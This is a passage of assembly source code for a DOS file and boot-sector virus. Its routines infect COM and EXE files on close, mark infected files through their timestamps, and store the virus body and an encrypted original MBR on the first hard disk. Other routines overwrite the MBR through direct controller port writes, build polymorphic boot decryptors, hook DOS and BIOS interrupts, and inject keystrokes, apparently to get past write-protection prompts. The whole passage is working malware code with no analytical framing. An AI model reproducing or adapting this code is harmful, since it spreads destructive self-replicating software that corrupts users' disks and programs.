		MOV     AX, [DI+0CH]
		MOV     Trace_Int, AX

		MOV     AL, [DI+0EH]

		CMP     AL, 01h
		JE      LOC_167

		ADD     SP,4
		STC
		RETN
LOC_167:
		POP     CX
		POP     DX

		PUSH    DX
		PUSH    CX

		AND     DX, 1FFh

		CMP     File_Mod512, DX
		JE      LOC_168

		ADD     SP, 04h
		STC
		RETN
LOC_168:
		XOR     CX, CX                  ; Go to start of file.
		MOV     DX, CX
		MOV     AX, 4200h
		CALL    Traced_i21h

		MOV     DX, OFFSET Buffer       ; Read header.
		MOV     CX, 28
		MOV     AH, 40h
		CALL    Traced_i21h

		POP     CX                      ; Go to start of file.
		POP     DX
		MOV     AX, 4200h
		CALL    Traced_i21h

		MOV     AH, 40h                 ; Write <EOF> marker.
		XOR     CX, CX
		CALL    Traced_i21h

		RETN



Set_Dummy_Handlers:
		PUSH    ES

		XOR     AX, AX
		MOV     ES, AX

		MOV     AX, ES:[24h * 4]        ; Save INT 24h.
                MOV     CS:Int24h, AX           ; (Critical error-handler).
		MOV     AX, ES:[24h * 4 + 2]
		MOV     CS:Int24h+2, AX

		MOV     AX, ES:[1Bh * 4]        ; Save INT 1Bh.
		MOV     CS:DATA_122, AX         ; (Ctrl-Break handler).
		MOV     AX, ES:[1Bh * 4 + 2]
		MOV     CS:DATA_123, AX

		MOV     ES:[24h * 4 + 2], CS    ; Dummy error-handler.
		MOV     ES:[24h * 4], OFFSET NewInt24h

		MOV     ES:[1Bh * 4 + 2], CS    ; Dummy Ctrl-Break handler.
		MOV     ES:[1Bh * 4], OFFSET Do_IRET

		POP     ES

		RETN


Restore_Dummy_Handlers:

		PUSH    DS
		PUSH    ES
		PUSH    SI

		XOR     AX, AX
		CLD

		PUSH    CS
		POP     DS

		MOV     ES, AX

		MOV     SI, OFFSET Int24h       ; Restore original INT 24h.
		MOV     DI, 24h * 4
		MOVSW
		MOVSW

		MOV     DI, 1Bh * 4             ; Restore original INT 1Bh.
		MOVSW
		MOVSW

		POP     SI
		POP     ES
		POP     DS

		RETN


Make_Random_Stack:

                CALL    Get_Random_Poly

                AND     AX, 00000011b           ; Mask between 0 - 3.
                JZ      Make_Random_Stack

                ADD     AX, Init_CS             ; Variable stacksegment.
		MOV     Init_SS, AX

                CALL    Get_Random_Poly
                AND     AX, 00000111b           ; 0 - 7.
		ADD     AX, (Virus_Size + 272)

		AND     AL, 11111110b
		MOV     Init_SP, AX

		RETN


Infect_Close:
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		PUSH    DS
		PUSH    DI
		PUSH    SI
		PUSHF

		PUSH    AX
		CALL    Set_Dummy_Handlers

		TEST    CS:Flags, 00000001b
		JNZ     LOC_172

		CALL    Save_FileTime
		MOV     AX, CS:Trace_Int
		AND     AL, 00011111b           ; Mask seconds.

		CMP     AL, 00010001b           ; Infected stamp?
		JE      LOC_172

		CALL    Get_FileName
		JC      LOC_172

		XOR     CX, CX                  ; Go to begin file.
		MOV     DX, CX
		MOV     AX, 4200h
		CALL    Traced_i21h
		JC      LOC_172

		MOV     AH, 3Fh                 ; Read header.
		MOV     CX, 28

		PUSH    CS
		POP     DS

		PUSH    DS
		POP     ES

		MOV     DX, OFFSET Buffer
		CALL    Traced_i21h
		JC      LOC_172

		CMP     AX, CX                  ; Bytes read not equal?
		JNE     LOC_172

		MOV     SI, DX
		CLD
		LODSW                           ; String [si] to ax

		CMP     AX, 'ZM'                ; True .EXE-file?
		JE      LOC_170

		CMP     AX, 'MZ'                ; True .EXE-file?
		JE      LOC_170

		CALL    Infect_COM
		JC      LOC_172

		JMP     LOC_171
LOC_170:
		CALL    Infect_EXE
		JC      LOC_172
LOC_171:
		MOV     AX, Trace_Int
		AND     AL, 0E0h
		OR      AL, 11h
		MOV     Trace_Int, AX
		CALL    Restore_FileTime
LOC_172:
		POP     AX
		POPF
		MOV     AH, 3Eh                 ; Close file.
		CALL    Traced_i21h

		PUSH    AX
		PUSHF
		CALL    Restore_Dummy_Handlers

		POPF
		POP     AX
		POP     SI
		POP     DI
		POP     DS
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		RETN



Get_FileName:
		PUSH    BX

		MOV     AX, 1220h               ; Get DCB-number.
		INT     2Fh
		JNC     LOC_174

Error_DCB:      STC
		JMP     LOC_183
		NOP
LOC_174:
		CMP     BYTE PTR ES:[DI], 0FFh  ; Filehandle not open?
		JE      Error_DCB

		XOR     BX, BX
		MOV     BL, ES:[DI]

		MOV     AX, 1216h               ; Get DCB-address.
		INT     2Fh
		JC      LOC_183

		PUSH    ES
		POP     DS

		PUSH    CS
		POP     ES

;*              AND     [DI+2],0FFF8H
		DB       83H, 65H, 02H,0F8H     ;  Fixup - byte match
		OR      WORD PTR [DI+2], 02h    ; Set file open-mode to r/w.
		ADD     DI, 20h
		MOV     SI, DI
		CLD
		PUSH    SI
		MOV     DI, OFFSET FileName2
		XOR     BX, BX
		MOV     CX, 08h

LOCLOOP_175:
		LODSB                           ; String [si] to al

		CMP     AL, ' '
		JE      LOC_176

		STOSB
		INC     BX
		LOOP    LOCLOOP_175

LOC_176:
		MOV     AL, '.'
		STOSB
		INC     BX
		POP     SI
		ADD     SI, 08h
		MOV     CX, 03h

LOCLOOP_177:
		LODSB                           ; String [si] to al
		CMP     AL, ' '
		JE      LOC_178

		STOSB
		INC     BX
		INC     BH
		LOOP    LOCLOOP_177

LOC_178:
		CMP     BH, 03h
		JE      LOC_180
LOC_179:
		STC
		JMP     LOC_183
LOC_180:
		SUB     SI,3
		LODSW                           ; String [si] to ax

		CMP     AX, 'XE'                ; .EXE-file?
		JE      LOC_181

		CMP     AX, 'OC'                ; .COM-file?
		JNE     LOC_179
LOC_181:
		LODSB                           ; String [si] to al

		CMP     AX, 'XE'                ; .EXE-file?
		JE      LOC_182

		CMP     AX, 'OM'                ; .COM-file?
		JNE     LOC_179
LOC_182:
		MOV     BH, 00h
		CALL    SUB_14
LOC_183:
		POP     BX

		RETN

Check_Infect:
		TEST    Flags, 00000100b
                JZ      No_JMP_Start

                CMP     Host_Type, 00h          ; Host is .COM-file?
                JE      Handle_COM1

                MOV     AX, [SI+0Eh]            ; SS.
                SUB     AX, [SI+16h]            ; Minus CS.
                JZ      No_JMP_Start

		SUB     AX, 03h
                JA      No_JMP_Start

                MOV     AX, [SI+14h]            ; AX = IP.

		CMP     AX, OFFSET Buffer
                JB      No_JMP_Start

		CMP     AX, 1EC4h
                JA      No_JMP_Start

		STC

		RETN
Handle_COM1:
                CMP     BYTE PTR [SI], 0E9h     ; Starts with a JMP ?
                JNE     No_JMP_Start

		STC

		RETN
No_JMP_Start:
		CLC

		RETN



Infect_Harddisk:

		MOV     AX, 5445h               ; Residency-check.
		INT     13h

		CMP     AX, 4554h               ; Are we already resident?
		JE      JMP_Exit_HD_Infect      ; (harddisk already infected)

		PUSH    CS
		POP     ES

		XOR     AX, AX
		MOV     DS, AX

		MOV     SI, 13h * 4             ; Save INT 13h.
		MOV     DI, OFFSET Traced_Int13h

		CLD
		MOVSW
		MOVSW

		PUSH    CS
		POP     DS

		MOV     DX, 80h                 ; Read MBR of 1st harddisk.
		MOV     CX, 01h
		MOV     AX, 0201h
		MOV     BX, OFFSET Buffer
		CALL    Traced_i13h
		JNC     No_Err_1

JMP_Exit_HD_Infect:

		JMP     LOC_RET_189
		NOP
No_Err_1:
		MOV     AX, Drew2
		SUB     AX, Drew1

		CMP     AX, 0CCFFh              ; Already infected?
		JE      JMP_Exit_HD_Infect

		MOV     AH, 08h                 ; Get disk drive parameters.
		MOV     DL, 80h
		CALL    Traced_i13h

		MOV     AX, 0310h               ; Store virusbody on HD.
		XOR     BX, BX
		INC     CH
		MOV     DATA_150, CX
		DEC     DH
		SUB     CL, 16                  ; - Virus_Size
		MOV     DL, 80h
		CALL    Traced_i13h
		JC      JMP_Exit_HD_Infect

		ADD     CL, 16                  ; Store original MBR.
		MOV     BX, OFFSET Buffer
		MOV     AX, 0301h
		CALL    Encrypt_Boot
		CALL    Traced_i13h
		JC      JMP_Exit_HD_Infect

		CLD
		MOV     BL, 01h
		CALL    SUB_49
		MOV     DX, 80h
		MOV     CX, 01h
		MOV     AX, 0301h
		MOV     BX, OFFSET Buffer

		TEST    Flags, 10000000b      ; Win95/NT active?
		JZ      LOC_188

		PUSH    AX                      ; PARAMETER_4
		PUSH    BX                      ; PARAMETER_3
		PUSH    CX                      ; PARAMETER_2
		PUSH    DX                      ; PARAMETER_1
		CALL    Infect_Exec2
		JNC     LOC_RET_189             ; Jump if carry=0
LOC_188:
		CALL    Infect_Exec3

LOC_RET_189:
		RETN

		CLI
		XOR     AX, AX
		MOV     SS, AX                  ; Setup stack.
		MOV     SP, 7C00h
		MOV     DS, AX
Init_Boot_Key:  MOV     CH, 0
                ORG     $-1
Boot_Key        DB      0B8h
Boot_Ptr:       MOV     SI, 0
                ORG     $-2
Start_Encr      DW      7C16h
Screw1:

LOC_190:
		SUB     [SI], CH
Change_Ptr:     INC     SI
Change_Key:     INC     CH
Boot_Loop:      JL      LOC_190                 ; Jump if <
Encr_Boot:

		STI

		INT     12h
		SUB     AX, 9                   ; Reserve our memory.

		MOV     CL, 6                   ; Convert to segment-address.
		SHL     AX, CL

		MOV     ES, AX

		MOV     AH, 08h                 ; Get disk drive parameters.
		MOV     DL, 80h
		INT     13h

		INC     CH
		DEC     DH
		SUB     CL, 10h
		MOV     DL, 80h
		MOV     AX, 0211h               ; Read virusbody from disk.
		XOR     BX, BX
		INT     13h

		PUSH    ES
		MOV     AX, OFFSET Reloc_Boot
		PUSH    AX
		RETF


Traced_Int13h   DW      0, 0

Reloc_Boot:
		PUSH    DS                      ; ES = 0.
		POP     ES

		PUSH    CS
		POP     DS

		MOV     DI, 7C00h

		PUSH    ES
		PUSH    DI

		MOV     SI, 2000h

		CLD
		MOV     CX, 512
		REP     MOVSB

		CALL    Botty
		STI
		RETF

SUB_49:
                MOV     Poly_Sector, 00h
		PUSH    BX
		CLD
                CALL    Get_Ran_3

                MOV     AH, Mov_Ptr[BX]
                MOV     BYTE PTR Boot_Ptr, AH
                MOV     AH, Inc_Ptr[BX]
                MOV     BYTE PTR Change_Ptr, AH
		MOV     DL, BL
		ADD     BL, 03h

		CMP     BL, 03h
		JNE     LOC_191

		SUB     BL,2
LOC_191:
		MOV     DATA_94,BL
LOC_192:
                CALL    Get_Random_Poly
		NOT     AX
		AND     AL, 07h
		MOV     BL, AL
		SHR     AL, 01h

		CMP     DATA_94, AL
		JE      LOC_192

		MOV     DATA_95, BL
		MOV     AH, DATA_110[BX]
                MOV     BYTE PTR Init_Boot_Key, AH
		MOV     AH, DATA_115[BX]
                MOV     BYTE PTR Change_Key+1, AH
		SHL     DL, 03h
		ADD     BL, DL
		MOV     AH, DATA_111[BX]
		MOV     byte ptr Screw1+1, AH
                CALL    Get_Random_Poly
		MOV     BL, AH
		AND     BX, 03h

		MOV     AH, DATA_117[BX]
                MOV     BYTE PTR Boot_Loop, AH
                CALL    Get_Ran_3
                MOV     AL, Encr_Methods[BX]
		MOV     AH, 0E0h
                MOV     WORD PTR Bozo, AX
		XOR     BL, 03h
                MOV     AL, Encr_Methods[BX]
		MOV     byte ptr Screw1, AL

LOC_193:
                CALL    Get_Random_Poly
		OR      AH, 10000000b

		CMP     AH, 0D8h
		JAE     LOC_193

		POP     BX
		PUSH    BX
		PUSH    AX
		MOV     BH, 00h
                MOV     Boot_Key, AH
		MOV     SI, 1409h
		MOV     DI, OFFSET Buffer
                MOV     Start_Encr, 7C16h

		CMP     BL, 02h
		JNE     LOC_194

                MOV     DI,1EA8h
                MOV     Start_Encr, 7C54h
LOC_194:
                CALL    Get_Random_Poly
		AND     AX, 03h
		XCHG    BX, AX
		MOV     AL, DATA_119[BX]
		MOV     [SI+2], AL
		MOV     AL, 0D0h
		ADD     AL, BL
		MOV     [SI+4], AL

		MOVSW
		MOVSW
		MOVSW
		MOVSW

		MOV     DH, BL
		XOR     CX, CX
		CALL    SUB_50
                CALL    Get_Random_Poly
		OR      AX, AX
		JP      LOC_195                 ; Jump if parity=1
		MOV     AX,[SI]
		ADD     SI, 02h
		OR      Flags, 00001000b
		MOVSW
		MOVSB
		STOSW
		JMP     LOC_196
LOC_195:
		MOVSW
		MOVSW
		MOVSB
LOC_196:
		CALL    SUB_51
		MOVSW                           ; Mov [si] to es:[di]
		MOV     DATA_93, 0FFh
		CALL    SUB_27
		CALL    SUB_52
		LODSW                           ; String [si] to ax
		SUB     AH, CL
		STOSW
		SUB     CL, CH
		MOV     AL, CH

		TEST    Flags, 00001000b
		JZ      LOC_197

		ADD     AL, 02h
LOC_197:
		AND     Flags, 0F7h
		CBW                             ; Convrt byte to word
		MOV     SI, 1E77h
		SUB     SI, AX
		MOV     AX, CX
		POP     CX
		POP     BX
		PUSH    CX

		CMP     BL, 02h
		JNE     LOC_198

		ADD     SI, 3Eh
LOC_198:
		CBW                             ; Convrt byte to word
		ADD     [SI],AX
		POP     AX
		MOV     CX,1FH
		MOV     SI,1DEFH

		CMP     BL, 02h
		JE      LOCLOOP_199

		CMP     BL, 01h
		JNE     LOC_RET_200

		MOV     CX, 28h
		MOV     SI, 141Fh

LOCLOOP_199:
		LODSB                           ; String [si] to al

Bozo:
;*              ADD     AL,AH
		DB       00H,0E0H               ;  Fixup - byte match
		INC     AH
		STOSB                           ; Store al to es:[di]
		LOOP    LOCLOOP_199

                CALL    Get_Random_Poly
		NOT     AX
		MOV     Drew1, AX
		ADD     AX, 0CCFFh
		MOV     Drew2, AX

LOC_RET_200:
		RETN


SUB_50:
		ADD     SI, 02h
                CALL    Get_Random_Poly
		NOT     AX
		AND     AL, 03h
		MOV     BL, AL
		MOV     DL, [BX+Overrides]

		CMP     AL, 01h
		JE      LOC_203

		CMP     AL, 03h
		JE      LOC_203

		SHR     BL, 01h
		MOV     AL, 06h
		MUL     BL                      ; ax = reg * al
		MOV     BX, AX
LOC_201:
                CALL    Get_Random_Poly
                AND     AH, 03h                 ; 0 - 3.

                CMP     AH, 03h                 ; 0, 1, 2
		JE      LOC_201

                SHL     AH, 1                   ; MUL 2.
                ADD     BL, AH
		MOV     AX, DATA_118[BX]

		CMP     AL, 16h
		JE      LOC_203

		CMP     AL, 50h
		JNE     LOC_202

		ADD     AL, DH
		STOSW

		RETN

LOC_202:
		ADD     AH, DH
		STOSW

		RETN
LOC_203:
		MOV     CH, 02h

		RETN



SUB_51:
		CMP     DL, 3Eh
		JE      LOC_RET_204

		MOV     AL, DL
		STOSB

		ADD     CL, 01h

LOC_RET_204:
		RETN


SUB_52:
                CALL    Get_Random_Poly
		NOT     AX
		ADD     AL,AH

		CMP     AL, 85
		JB      LOC_206

		ADD     SI, 02h
		ADD     CL, 01h
		MOV     BL, DATA_95

		CMP     AL, 0AAh
		JB      LOC_205

		MOV     AL, 80h
		MOV     AH, DATA_115[BX]
		STOSW

		MOV     AL, 01h
		STOSB

		RETN
LOC_205:
		MOV     AL, 80h
		MOV     AH, DATA_116[BX]
		STOSW

		MOV     AL, 0FFh
		STOSB

		RETN
LOC_206:
		MOVSW                           ; Mov [si] to es:[di]
		RETN



Encrypt_Boot:
		PUSHF
		PUSH    AX
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    DI
		PUSH    SI

		CLD
		MOV     DX, BX
		MOV     DI, DX
		MOV     AX, 'ef'
		MOV     BX, 7463h
		MOV     CX, 200h                ; 1024 bytes.

LOCLOOP_207:
		SCASW                           ; Scan es:[di] for ax
		JNZ     LOC_208

		XCHG    BX, AX

		SCASW                           ; Scan es:[di] for ax
		JZ      LOC_209

		XCHG    BX, AX
		SUB     DI, 02h
LOC_208:
		DEC     DI
		LOOP    LOCLOOP_207

		JMP     LOC_215
LOC_209:
		MOV     AX, 4Eh
LOC_210:
		MOV     CX, 200h
		MOV     DI, DX
		MOV     SI, 0Ch

LOCLOOP_211:
		SCASW                           ; Scan es:[di] for ax
		JNZ     LOC_212

		ADD     ES:[DI-2], SI
LOC_212:
		DEC     DI
		LOOP    LOCLOOP_211

		DEC     AX
		DEC     AX

		CMP     AX, 4Ch
		JE      LOC_210

		MOV     DI, DX
		MOV     CX, 1C0h
		MOV     AX, 280h

LOCLOOP_213:
		SCASW                           ; Scan es:[di] for ax
		JC      LOC_214

		DEC     DI
		DEC     DI
		PUSH    AX
		DEC     AX
		DEC     AX
		SCASW                           ; Scan es:[di] for ax
		POP     AX
		JA      LOC_214

		SUB     ES:[DI-2],SI
LOC_214:
		DEC     DI
		LOOP    LOCLOOP_213

LOC_215:
		POP     SI
		POP     DI
		POP     DX
		POP     CX
		POP     BX
		POP     AX
		POPF

		RETN



SUB_54:
		MOV     AX, 0201h               ; Read MBR of 1st harddisk.
		MOV     BX, OFFSET Buffer

		XOR     CX, CX
		MOV     DS, CX

		PUSH    CS
		POP     ES

		INC     CX                      ; MBR.
		MOV     DX, 80h
		INT     13h

		MOV     DI, OFFSET Drew3
		MOV     SI, DATA_25E
		MOV     CL, 40h
		REP     MOVSB

		INC     CX

		PUSH    CS
		POP     DS

		MOV     AX, 0301h
		MOV     DATA_138, CH
		CALL    Infect_Exec3

		RETN

DATA_138        DB      0

SUB_55:
		PUSH    AX
		PUSH    BX
		PUSH    DX

		MOV     AX, 0201h               ; Read MBR of 1st harddisk.
		MOV     BX, OFFSET Buffer
		PUSH    CS
		POP     ES
		MOV     CX, 01h
		MOV     DX, 80h
		CALL    Traced_i13h

		MOV     DI, OFFSET Drew3
		MOV     CL, 40h
		REP     STOSB

		INC     CX
		MOV     AX, 0301h
		CALL    Infect_Exec3

		POP     DX
		POP     BX
		POP     AX

		RETN

Botty:

		CALL    SUB_54
		CALL    SUB_4

		XOR     AX, AX
		MOV     DS, AX

		MOV     SI, 1Ch * 4
		MOV     DI, OFFSET Int1Ch

		MOVSW
		MOVSW

		MOV     SI, 21h * 4
		MOV     DI, OFFSET Int13h

		MOVSW
		MOVSW

		INT     12h                     ; Save total DOS-memory.
		MOV     CS:Dos_Mem, AX          ; Save it.

		SUB     WORD PTR DS:[413h], 9   ; Subtract our needs.
                NOP

		MOV     BYTE PTR CS:DATA_77, 02h

		CLI                             ; Hook INT 1Ch (timer).
		MOV     DS:[1Ch * 4 + 2], CS
		MOV     DS:[1Ch * 4], OFFSET NewInt1Ch
		STI

		CALL    Check_Poly_Sector

		RETN

NewInt1Ch:
		PUSH    AX
		PUSH    DS
		PUSH    ES
		PUSH    SI
		PUSH    DI

		XOR     AX, AX
		MOV     DS, AX

		MOV     SI, 21h * 4

		PUSH    CS
		POP     ES

		MOV     DI, OFFSET Int13h
		CLD

		CMPSW                           ; Cmp [si] to es:[di]
		JZ      LOC_216

		MOV     AL, 01h
LOC_216:
		CMPSW                           ; Cmp [si] to es:[di]
		JZ      LOC_217

		MOV     AH, 01h
LOC_217:
		OR      AX, AX
		JZ      LOC_218

		SUB     SI,4
		SUB     DI,4
		MOVSW
		MOVSW

		DEC     BYTE PTR ES:DATA_77
		JNZ     LOC_218

		MOV     DI, OFFSET Traced_Int13h
		MOV     SI, 13h * 4

		MOVSW
		MOVSW

		MOV     DI, OFFSET Int13h
		MOV     SI, 13h * 4

		MOVSW
		MOVSW

		MOV     DI, OFFSET Traced_Int21h
		MOV     SI, 21h * 4

		MOVSW
		MOVSW

		MOV     DS:[1Ch * 4], OFFSET Int1Ch_Di
LOC_218:
		POP     DI
		POP     SI
		POP     ES
		POP     DS
		POP     AX

Exit_Int1Ch:    JMP     DWORD PTR CS:Int1Ch


Int1Ch_Di:
		PUSH    AX
		PUSH    DS
		PUSH    DI

		XOR     AX, AX
		MOV     DS, AX

		MOV     DS, DS:[22h * 4 + 2]    ; Get 1st instruction of
		MOV     AX, DS:[0]              ; INT 22h(terminate address).

		CMP     AX, 20CDh               ; INT 20h?
		JNE     LOC_220

		XOR     AX, AX
		MOV     DS, AX

		MOV     AX, CS:Dos_Mem          ; Put back old value.
		MOV     DS:[413h], AX

		MOV     AX, CS:Int1Ch           ; Restore original INT 1Ch.
		MOV     DS:[1Ch * 4], AX
		MOV     AX, CS:Int1Ch+2
		MOV     DS:[1Ch * 4 + 2], AX

		MOV     AX, DS:[21h * 4]        ; Save INT 21h.
		MOV     CS:Int21h,AX
		MOV     AX, DS:[21h * 4 + 2]
		MOV     CS:Int21h+2,AX

		MOV     AX, DS:[28h * 4]        ; Save INT 28h.
		MOV     CS:Int28h, AX
		MOV     AX, DS:[28h * 4 + 2]
		MOV     CS:Int28h+2, AX

		MOV     DS:[28h * 4], OFFSET NewInt28h  ; Hook INT 28h.
		MOV     DS:[28h * 4 + 2], CS

		MOV     DS:[21h * 4], OFFSET NewInt21h  ; Hook INT 21h.
		MOV     DS:[21h * 4 + 2], CS

		PUSH    SI
		PUSH    ES

		CALL    Slice_Int13h
		CALL    Insert_Slice

		POP     ES
		POP     SI
LOC_220:
		POP     DI
		POP     DS
		POP     AX

		JMP     Exit_Int1Ch

NewInt28h:
		PUSH    AX
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		PUSH    DS
		PUSH    DI
		PUSH    SI

		TEST    CS:DATA_138, 10000000b
		JNZ     LOC_221

		OR      CS:DATA_138, 10000000b
		CLD

		PUSH    CS
		POP     DS

		CALL    Unslice_Int13h
		CALL    Infect_Harddisk
		CALL    SUB_55
		CALL    Insert_Slice
LOC_221:
		CALL    SUB_56
		CALL    SUB_57

		POP     SI
		POP     DI
		POP     DS
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

                DB      0EAh                    ; JMP FAR opcode.
Int28h          DW      0, 0



SUB_56:

		MOV     AX,160Ah                ; Identify Windows version
		INT     2Fh                     ; and type.

		OR      AX, AX                  ; Valid function?
		JNZ     LOC_223

		CMP     BH, 04h                 ; Windows 95/NT ?
		JB      LOC_223                 ; Else abort function.

		OR      CS:Flags, 00000100b

		MOV     AX, 5445h               ; INT 13h residency-check.
		INT     13h

		CMP     AX, 4554h               ; Have we hooked INT 13h?
		JE      LOC_RET_222

		OR      CS:DATA_138, 00000010b

		MOV     AX, 3513h               ; Get address INT 13h.
		INT     21h

                MOV     CS:Traced_Int13h, BX    ; Save address INT 13h.
		MOV     CS:Traced_Int13h+2, ES

		XOR     AX, AX
		MOV     DS, AX

		MOV     DS:[13h * 4], OFFSET NewInt13h
		MOV     DS:[13h * 4 + 2], CS

LOC_RET_222:
		RETN
LOC_223:
		AND     CS:Flags, 11111011b
		AND     CS:DATA_138, 11111100b

		RETN



SUB_57:
		TEST    CS:Flags, 00000100b
		JNZ     LOC_RET_224

		MOV     AX, 5445h               ; INT 13h hooked already?
		INT     13h

		CMP     AX, 4554H
		JE      LOC_RET_224

		MOV     AX, CS:Int13h
		MOV     CS:Traced_Int13h, AX
		MOV     AX, CS:Int13h+2
		MOV     CS:Traced_Int13h+2, AX
                AND     CS:DATA_138, 0FCh

		CALL    Slice_Int13h
		CALL    Insert_Slice

LOC_RET_224:
		RETN



Traced_i13h:
		PUSHF
		CALL    DWORD PTR CS:Traced_Int13h

		RETN


NewInt16h:
                CMP     AH, 01h                 ; Read keyboard-status?
                JA      JMP_Int16h

                CMP     AH, 01h                 ; Read keyboard-status?
		JE      LOC_225

		CALL    Infect_Exec1
                CALL    OldInt16h               ; Execute function.
                CALL    Get_Proceed_Char

		MOV     BYTE PTR CS:Dum2, 02h

                RETF    2                       ; Return to caller.

LOC_225:
		DEC     BYTE PTR CS:[18EDH]
                JNZ     JMP_Int16h

		MOV     BYTE PTR CS:[18EDH], 5

		PUSH    AX
		PUSH    CX

                CALL    Get_Proceed_Char
		MOV     CX, AX
		MOV     AH, 05h
		INT     16h                     ; Keyboard i/o  ah=function 05h
						;  stuff key cx into keybd buffr
		POP     CX
		POP     AX
		CALL    OldInt16h
		RETF    2                       ; Return far

JMP_Int16h:
                DB      0EAh                    ; JMP to original handler.
Int16h          DW      0, 0

Dum3            DB      04h
Dum1            DW      0
Dum2            DB      02h

OldInt16h:
		PUSHF
		CALL    DWORD PTR CS:Int16h

		RETN


;fuck
Proceed_Key     DW      1559h           ; Y
                DW      314Eh           ; N
                DW      314Eh           ; N
                DW      314Eh           ; N
                DW      1559h           ; Y
                DW      1559h           ; Y
                DW      314Eh           ; N
                DW      1559h           ; Y


Get_Proceed_Char:

		PUSH    DI

		MOV     DI, CS:Dum1
		MOV     AL, CS:Dum2
                CBW
		ADD     DI, AX
                MOV     AX, CS:Proceed_Key[DI]

		POP     DI

		RETN



Infect_Exec1:
		PUSH    AX
		PUSH    CX

		MOV     AH, 01h                 ; Read keyboard-status.
		CALL    OldInt16h
		JZ      LOC_227

		XCHG    CX, AX
                CALL    Get_Proceed_Char

		CMP     AX, CX
		JE      LOC_228

		PUSH    DS

		XOR     AX, AX
		MOV     DS, AX

		MOV     AX, DS:[41Ah]           ; Address BASIC errorhandler.
		MOV     DS:[41Ch], AX           ; Mink (?).

		POP     DS
LOC_227:
                CALL    Get_Proceed_Char
                MOV     CX, AX                  ; Write to keyboard-buffer.
		MOV     AH, 05h
                INT     16h

LOC_228:
		POP     CX
		POP     AX

		RETN



Infect_Exec2:

PARAMETER_1     =       4                       ; BP+4
PARAMETER_2     =       6                       ; BP+6
PARAMETER_3     =       8                       ; BP+8
PARAMETER_4     =       0AH                     ; BP+0AH

		PUSH    BP
		MOV     BP, SP

                MOV     Trace_Function, 0       ; Function: Reset disk.
		MOV     First_MCB, 71h
                MOV     Fake_PUSHF, 00h
		MOV     Trace_Done, 01h

		MOV     AX, 3513h               ; Get INT 13h.
		INT     21h

		MOV     Trace_Int, BX
		MOV     Trace_Int+2, ES
		CALL    Tracer

		CLD                             ; Replace INT 13h address
		MOV     SI, OFFSET Trace_Int    ; with traced address.
		MOV     DI, OFFSET Traced_Int13h
		MOVSW
		MOVSW

		MOV     AX, 440Dh
		MOV     BX, 180h
		MOV     CX, 84Bh
		INT     21h                     ; DOS Services  ah=function 44h
						;  IOctl-D block device control
						;   bl=drive, cx=category/type
						;   ds:dx ptr to parameter block

		MOV     AX, 3516h               ; Get INT 16h.
		INT     21h

		MOV     Int16h, BX              ; Save address INT 16h.
		MOV     Int16h+2, ES

		MOV     Dum3, 05h
                MOV     Dum1, 0
		MOV     DX, OFFSET NewInt16h
		MOV     AX, 2516h               ; Hook INT 16h (keyboard).
		INT     21h

		PUSH    CS
		POP     ES

		MOV     BX, [BP+PARAMETER_3]
		MOV     CX, [BP+PARAMETER_2]
		MOV     DX, [BP+PARAMETER_1]
LOC_229:
		MOV     AX, [BP+PARAMETER_4]
		CALL    Traced_i13h
		JNC     LOC_230

		MOV     AX, Dum1
		ADD     AL, 04h
		MOV     Dum1, AX
		MOV     Dum2, 00h

		CMP     AL, 0Ch
		JBE     LOC_229

		STC
LOC_230:
		PUSHF
		PUSH    DS
		LDS     DX, DWORD PTR Int16h
		MOV     AX, 2516h               ; Restore original INT 16h.
		INT     21h

		POP     DS
		POPF
		POP     BP

		RETN    8


Infect_Exec3:
		CALL    Infect_Exec6
		JC      LOC_232

		JMP     LOC_233
LOC_231:
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX
LOC_232:
		CALL    Traced_i13h
		JMP     LOC_RET_236


LOC_233:
		PUSH    AX
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES

		MOV     DI, 04h
LOC_234:
		MOV     SI, BX

		DEC     DI
		JZ      LOC_231

		MOV     AH, 00h                 ; Reset 1st harddisk.
		MOV     DL, 80h
		INT     13h

		XOR     AX, AX
		MOV     ES, AX

		MOV     ES:48Eh, AL

		CLD
		MOV     DX, 3F6h
                MOV     AL, 04h
                OUT     DX, AL                  ; Reset controller.

                JMP     $+2                     ; Delay for I/O.
                JMP     $+2

                MOV     AL, 0
                OUT     DX, AL                  ; al = 0, hdsk0 register
                CALL    Wait_Ready

                MOV     DX, 1F2h                ; Sector count.
                MOV     AL, 01h                 ; 1 sector.
                OUT     DX, AL

                JMP     $+2
                JMP     $+2

		INC     DX
                MOV     AL, 01h                 ; Sector: MBR.
                OUT     DX, AL

                JMP     $+2
                JMP     $+2

		INC     DX
                MOV     AL, 0
                OUT     DX, AL                  ; Cylinder lo.

                JMP     $+2
                JMP     $+2

		INC     DX
                MOV     AL, 0
                OUT     DX, AL                  ; Cylinder hi.

                JMP     $+2
                JMP     $+2

		INC     DX
                MOV     AL, 10100000b
                OUT     DX, AL                  ; 1st harddisk, head zero.

                JMP     $+2                     ; Delay for I/O.
                JMP     $+2

		INC     DX
		MOV     AL, 31h
                OUT     DX, AL                  ; Write sectors without retry.
                CALL    Wait_Servicing

                MOV     CX, 256
                MOV     DX, 1F0h                ; Data-register.
                DB      0F3h, 6Fh               ; REP OUTSW, (286+).
LOC_235:
		MOV     AL, ES:48Eh

		OR      AL, AL
		JZ      LOC_235

                CALL    Wait_Ready

                TEST    AL, 00100001b           ; Write fault?
		JNZ     LOC_234

		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

LOC_RET_236:
		RETN



Wait_Ready:

		MOV     DX, 1F7h
Not_Ready:
                IN      AL, DX                  ; Get status-register.

                TEST    AL, 10000000b           ; Controller executing
                JNZ     Not_Ready               ; command?

		RETN



Wait_Servicing:
                CALL    Wait_Ready

                TEST    AL, 00001000b           ; Disk buffer requires
                JZ      Wait_Servicing          ; servicing?

		RETN


; Sets CF
Infect_Exec6:
		PUSH    AX
		PUSH    BX

		MOV     AX, SP

		PUSH    SP
		POP     BX

		STC
		PUSHF

		CMP     AX, BX
		JNE     LOC_239

		MOV     AL, 12h
		CALL    Infect_Exec7

		POPF
		CLC
		PUSHF

		AND     AH, 11110000b

		CMP     AH, 00010000b
		JA      LOC_239

		POPF
		STC
		PUSHF
LOC_239:
		POPF
		POP     BX
		POP     AX

